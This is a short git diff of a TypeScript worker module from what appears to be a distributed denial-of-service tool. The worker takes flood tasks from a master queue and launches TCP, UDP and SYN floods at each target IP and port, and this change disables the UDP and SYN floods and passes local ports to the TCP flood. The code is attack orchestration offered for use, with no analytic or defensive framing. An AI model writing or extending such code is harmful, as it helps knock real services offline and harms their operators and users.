@@ -1,8 +1,8 @@
 import BeeQueue = require('bee-queue');
 import portScanner = require('portscanner');
-import { synFlood } from './attacks/syn-flood';
+// import { synFlood } from './attacks/syn-flood';
 import { tcpFlood } from './attacks/tcp-flood';
-import { udpFlood } from './attacks/udp-flood';
+// import { udpFlood } from './attacks/udp-flood';
 import { FloodTask, IPScanTask } from './master';
 
 let portScanQueue: BeeQueue;
@@ -48,9 +48,9 @@ function startProcessingAttackTasks () {
     for (let i = 0; i < floodTask.targets.length; i++) {
       let target = floodTask.targets[i];
 
-      promises.push(tcpFlood(target.ip, target.port));
-      promises.push(udpFlood(target.ip, target.port));
-      promises.push(synFlood(target.ip, target.port));
+      promises.push(tcpFlood(target.ip, target.port, floodTask.localPorts));
+      // promises.push(udpFlood(target.ip, target.port));
+      // promises.push(synFlood(target.ip, target.port));
     }
 
     await Promise.all(promises);
